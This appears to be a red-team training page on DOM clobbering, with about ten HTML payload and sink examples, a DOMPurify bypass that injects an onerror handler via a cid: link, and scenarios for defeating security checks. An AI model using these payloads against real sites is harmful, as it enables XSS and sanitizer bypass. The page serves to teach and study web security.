---
layout: training-page
title: "DOM Clobbering — Red Team Academy"
module: "Web Hacking"
tags:
  - dom-clobbering
  - xss
  - html-injection
  - javascript
page_key: "web-dom-clobbering"
render_with_liquid: false
---

# DOM Clobbering

DOM Clobbering is a technique where named HTML elements — specifically those with `id`
  or `name` attributes — overwrite global JavaScript variables or object properties.
  Browsers expose certain HTML elements as properties of `window` or `document`,
  and when a script later references those names, it reads the DOM element rather than the expected
  JavaScript value. This can hijack application logic, bypass sanitizers, and enable XSS.

Exploitation requires the ability to inject arbitrary HTML into the page (HTML injection). DOM
  Clobbering does not require direct script injection — only markup injection.

## Tools

- domclob.xyz — comprehensive browser-specific payload list — `domclob.xyz/domc_markups/list`
- yeswehack/Dom-Explorer — test HTML parsers and sanitizers — `github.com/yeswehack/Dom-Explorer`

## Core Payloads

### Clobbering x.y.value (2 levels)

```
<!-- Payload: inject this HTML -->
<form id=x><output id=y>I've been clobbered</output></form>

<!-- Sink: script already in page reads this value -->
<script>alert(x.y.value);</script>
```

### Clobbering x.y using HTMLCollection (id + name)

When two elements share the same `id`, the browser creates an HTMLCollection.
  A second element with a `name` attribute on the same collection becomes a named property.

```
<!-- Payload -->
<a id=x></a><a id=x name=y href="Clobbered">

<!-- Sink -->
<script>alert(x.y)</script>
```

### 3-Level Deep Clobbering (x.y.z)

```
<!-- Payload -->
<form id=x name=y><input id=z></form>
<form id=x></form>

<!-- Sink -->
<script>alert(x.y.z)</script>
```

### 4+ Level Deep Clobbering via iframe srcdoc

```
<!-- Payload — uses nested iframes with srcdoc -->
<iframe name=a srcdoc="
  <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>
"></iframe>
<style>@import '//portswigger.net';</style>

<!-- Sink -->
<script>alert(a.b.c.d)</script>
```

### Clobbering forEach (Chrome only)

```
<!-- Payload -->
<form id=x>
  <input id=y name=z>
  <input id=y>
</form>

<!-- Sink -->
<script>x.y.forEach(element => alert(element))</script>
```

### Clobbering document.getElementById()

Using `<html>` or `<body>` tags with matching IDs can override
  what `getElementById` returns.

```
<!-- Payloads -->
<html id="cdnDomain">clobbered</html>
<svg><body id=cdnDomain>clobbered</body></svg>

<!-- Sink -->
<script>
  alert(document.getElementById('cdnDomain').innerText); // clobbered
</script>
```

### Clobbering x.username and x.password

Anchor elements expose `username` and `password` properties parsed from
  the href URL. This can clobber authentication-related variables.

```
<!-- Payload -->
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

<!-- Sink -->
<script>
  alert(x.username); // Clobbered-username
  alert(x.password); // Clobbered-password
</script>
```

### Firefox-Specific Payload

```
<!-- Payload -->
<base href=a:abc><a id=x href="Firefox<>">

<!-- Sink -->
<script>
  alert(x); // Firefox<>
</script>
```

### Chrome-Specific Payload

```
<!-- Payload -->
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

<!-- Sink -->
<script>
  alert(x.xyz); // a://Clobbered<>
</script>
```

## Bypassing Sanitizers (DOMPurify)

DOMPurify allows the `cid:` protocol, which does not encode double quotes.
  This can be leveraged to inject event handlers through clobbered attributes:

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

When a script reads `defaultAvatar.avatar`, it gets the href value. If the application
  then uses this as an image src, the unencoded quote breaks out and injects `onerror=alert(1)`.

## Attack Scenarios

### Bypassing Security Checks

If an application uses a pattern like `if (!config.allowedOrigins) { ... }` and
  `config` is sourced from a global that can be clobbered, injecting
  `<a id=config name=allowedOrigins href=x>` makes the check always pass.

### Script Gadget Exploitation

Many JavaScript frameworks contain "gadgets" — code paths that read DOM properties and execute
  them. DOM Clobbering can feed attacker-controlled values into these gadgets without direct script
  injection, bypassing CSP in some cases.

## Resources

- PayloadsAllTheThings DOM Clobbering — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering`
- PortSwigger DOM Clobbering — `portswigger.net/web-security/dom-based/dom-clobbering`
- domclob.xyz payload list — `domclob.xyz/domc_markups/list`
- Dom-Explorer tool — `github.com/yeswehack/Dom-Explorer`
- DOM Clobbering strikes back (Gareth Heyes) — `portswigger.net/research/dom-clobbering-strikes-back`
- Bypassing CSP via DOM Clobbering — `portswigger.net/research/bypassing-csp-via-dom-clobbering`
- Hijacking service workers via DOM Clobbering — `portswigger.net/research/hijacking-service-workers-via-dom-clobbering`
